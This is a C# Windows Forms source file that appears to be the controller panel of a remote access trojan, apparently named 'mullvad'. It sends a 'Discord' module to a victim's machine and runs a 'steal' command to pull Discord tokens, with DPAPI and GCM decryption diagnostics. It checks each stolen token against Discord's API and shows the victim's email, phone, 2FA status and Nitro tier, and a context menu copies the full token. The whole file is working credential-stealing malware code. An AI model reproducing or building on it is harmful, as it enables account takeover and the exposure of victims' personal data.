using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;
using System.Net.Http;
using System.Text.Json;

namespace mullvad.Forms
{
    public sealed class DiscordAccountForm : Form
    {
        private const string ModuleFile = "mullvad.Module.Discord";
        private const string ModuleId   = "mullvad.discord";

        private static readonly HttpClient _http = new();

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private readonly ToolStrip            _toolbar;
        private readonly ToolStripButton      _btnRefresh;
        private readonly ListView             _list;
        private readonly StatusStrip          _status;
        private readonly ToolStripStatusLabel _statusLabel;

        private static readonly Dictionary<ClientHandler, DiscordAccountForm> _openForms = new();

        public static DiscordAccountForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new DiscordAccountForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private DiscordAccountForm(ClientHandler handler)
        {
            _handler = handler;

            Text          = $"Discord — {handler.Info.Computer}";
            Size          = new Size(900, 480);
            MinimumSize   = new Size(600, 300);
            Font          = new Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterScreen;

            var ico = IconLoader.Load("discord.png") as Bitmap;
            if (ico is not null) try { Icon = Icon.FromHandle(ico.GetHicon()); } catch { }

            // ── Toolbar ───────────────────────────────────────────────────────
            _toolbar    = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };
            _btnRefresh = new ToolStripButton("Refresh")
            {
                DisplayStyle = ToolStripItemDisplayStyle.Image,
                ToolTipText  = "Re-steal tokens",
            };
            var refreshImg = IconLoader.Load("refresh.png");
            if (refreshImg is not null) _btnRefresh.Image = refreshImg;
            _btnRefresh.Click += (_, _) => _ = RunAsync();
            _toolbar.Items.Add(_btnRefresh);

            // ── ListView ──────────────────────────────────────────────────────
            _list = new ListView
            {
                Dock         = DockStyle.Fill,
                View         = View.Details,
                FullRowSelect = true,
                GridLines    = true,
                HideSelection = false,
                MultiSelect  = false,
            };
            _list.Columns.Add("Source",      90);
            _list.Columns.Add("Username",   130);
            _list.Columns.Add("Tag",        130);
            _list.Columns.Add("ID",         170);
            _list.Columns.Add("Email",      160);
            _list.Columns.Add("Phone",       90);
            _list.Columns.Add("Nitro",       90);
            _list.Columns.Add("2FA",         45);
            _list.Columns.Add("Verified",    55);
            _list.Columns.Add("Token",      140);

            // Right-click to copy token
            var ctxMenu  = new ContextMenuStrip();
            var copyItem = new ToolStripMenuItem("Copy token");
            var copyImg  = IconLoader.Load("page_copy.png");
            if (copyImg is not null) copyItem.Image = copyImg;
            copyItem.Click += (_, _) =>
            {
                if (_list.SelectedItems.Count == 0) return;
                var fullToken = _list.SelectedItems[0].Tag as string;
                if (!string.IsNullOrEmpty(fullToken))
                    try { Clipboard.SetText(fullToken); } catch { }
            };
            ctxMenu.Items.Add(copyItem);
            _list.ContextMenuStrip = ctxMenu;

            // ── Status ────────────────────────────────────────────────────────
            _status      = new StatusStrip();
            _statusLabel = new ToolStripStatusLabel("Initialising…") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
            _status.Items.Add(_statusLabel);

            Controls.Add(_list);
            Controls.Add(_toolbar);
            Controls.Add(_status);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _ = InitAsync();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _ctx?.Dispose();
            base.OnFormClosed(e);
        }

        // ── Init / run ─────────────────────────────────────────────────────────

        private async Task InitAsync()
        {
            SetStatus("Delivering module…");
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes is null) { SetStatus("Module not found — build the Discord project first."); return; }

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, null, cts.Token);
                if (!ok) { SetStatus("Module delivery failed."); return; }

                _ctx = new ModuleContext(_handler, ModuleId);
                _ctx.Disconnected += (_, _) => BeginInvoke(() => SetStatus("Client disconnected."));

                await RunAsync();
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Error: {ex.Message}"));
            }
        }

        private async Task RunAsync()
        {
            if (_ctx is null) return;
            _btnRefresh.Enabled = false;
            SetStatus("Extracting tokens…");
            _list.Items.Clear();

            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(15));
                string json = await _ctx.ExecuteAsync("steal", "", cts.Token);

                if (IsDisposed) return;

                List<(string token, string source)> rawTokens;
                string diagInfo = "";
                try
                {
                    using var doc = JsonDocument.Parse(json);
                    if (doc.RootElement.TryGetProperty("error", out var err))
                    {
                        BeginInvoke(() => SetStatus($"Module error: {err.GetString()}"));
                        return;
                    }

                    rawTokens = new List<(string, string)>();
                    foreach (var el in doc.RootElement.GetProperty("tokens").EnumerateArray())
                    {
                        var t = el.TryGetProperty("token",  out var tp) ? tp.GetString() : el.GetString();
                        var s = el.TryGetProperty("source", out var sp) ? sp.GetString() ?? "Unknown" : "Unknown";
                        if (!string.IsNullOrWhiteSpace(t)) rawTokens.Add((t!.Trim(), s));
                    }

                    if (doc.RootElement.TryGetProperty("diag", out var diag))
                    {
                        string dpapi = diag.TryGetProperty("dpapi",    out var d1) ? d1.GetString() ?? "" : "";
                        int    files = diag.TryGetProperty("files",    out var d2) ? d2.GetInt32() : 0;
                        int    gcmOk = diag.TryGetProperty("gcm_ok",   out var d3) ? d3.GetInt32() : 0;
                        int    gcmFl = diag.TryGetProperty("gcm_fail", out var d4) ? d4.GetInt32() : 0;
                        diagInfo = $"  [dpapi={dpapi} files={files} gcm_ok={gcmOk} gcm_fail={gcmFl}]";
                    }
                }
                catch (Exception ex)
                {
                    BeginInvoke(() => SetStatus($"Parse error: {ex.Message}"));
                    return;
                }

                if (rawTokens.Count == 0)
                {
                    BeginInvoke(() => SetStatus("No tokens found." + diagInfo));
                    return;
                }

                BeginInvoke(() => SetStatus($"Found {rawTokens.Count} token(s) — resolving accounts…{diagInfo}"));

                // Validate each token against Discord API
                var accounts = new List<(string token, string source, JsonElement user)>();
                var failCodes = new List<string>();
                foreach (var (tok, src) in rawTokens)
                {
                    try
                    {
                        using var req = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v10/users/@me");
                        req.Headers.TryAddWithoutValidation("Authorization", tok);
                        using var resp = await _http.SendAsync(req);
                        if (!resp.IsSuccessStatusCode)
                        {
                            failCodes.Add(((int)resp.StatusCode).ToString());
                            continue;
                        }
                        var body = await resp.Content.ReadAsStringAsync();
                        var doc2 = JsonDocument.Parse(body);
                        accounts.Add((tok, src, doc2.RootElement.Clone()));
                    }
                    catch (Exception ex) { failCodes.Add("ex:" + ex.GetType().Name); }
                }

                if (IsDisposed) return;
                BeginInvoke(() =>
                {
                    _list.Items.Clear();
                    if (accounts.Count == 0)
                    {
                        string codes = failCodes.Count > 0 ? "  codes=[" + string.Join(",", failCodes) + "]" : "";
                        SetStatus("No valid accounts." + codes + diagInfo);
                        _btnRefresh.Enabled = true;
                        return;
                    }
                    foreach (var (tok, src, user) in accounts)
                        AddRow(tok, src, user);
                    SetStatus($"{accounts.Count} valid account(s)  —  {DateTime.Now:HH:mm:ss}");
                    _btnRefresh.Enabled = true;
                });
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() =>
                {
                    SetStatus($"Error: {ex.Message}");
                    _btnRefresh.Enabled = true;
                });
            }
        }

        // ── List row ───────────────────────────────────────────────────────────

        private void AddRow(string token, string source, JsonElement user)
        {
            string Str(string key) => user.TryGetProperty(key, out var v) ? v.GetString() ?? "" : "";

            string username      = Str("username");
            string globalName    = Str("global_name");
            string discriminator = Str("discriminator");
            string id            = Str("id");
            string email         = Str("email");
            string phone         = Str("phone");
            bool   mfa           = user.TryGetProperty("mfa_enabled", out var mfaVal) && mfaVal.GetBoolean();
            bool   verified      = user.TryGetProperty("verified",    out var verVal) && verVal.GetBoolean();
            int    nitro         = user.TryGetProperty("premium_type", out var ntVal) ? ntVal.GetInt32() : 0;

            string nitroStr     = nitro switch { 1 => "Classic", 2 => "Nitro", 3 => "Basic", _ => "None" };
            string displayName  = string.IsNullOrEmpty(globalName) ? username : globalName;
            string tag          = discriminator is "0" or "" ? $"@{username}" : $"{username}#{discriminator}";

            var item = new ListViewItem(source);
            item.SubItems.Add(displayName);
            item.SubItems.Add(tag);
            item.SubItems.Add(id);
            item.SubItems.Add(email);
            item.SubItems.Add(phone);
            item.SubItems.Add(nitroStr);
            item.SubItems.Add(mfa      ? "Yes" : "No");
            item.SubItems.Add(verified ? "Yes" : "No");
            item.SubItems.Add(MaskToken(token));
            item.Tag = token; // full token stored for copy
            _list.Items.Add(item);
        }

        // ── Helpers ────────────────────────────────────────────────────────────

        private static string MaskToken(string token)
        {
            if (token.Length < 8) return "****";
            return token[..4] + "…" + token[^4..];
        }

        private void SetStatus(string text)
        {
            if (InvokeRequired) { BeginInvoke(() => SetStatus(text)); return; }
            _statusLabel.Text = text;
        }
    }
}
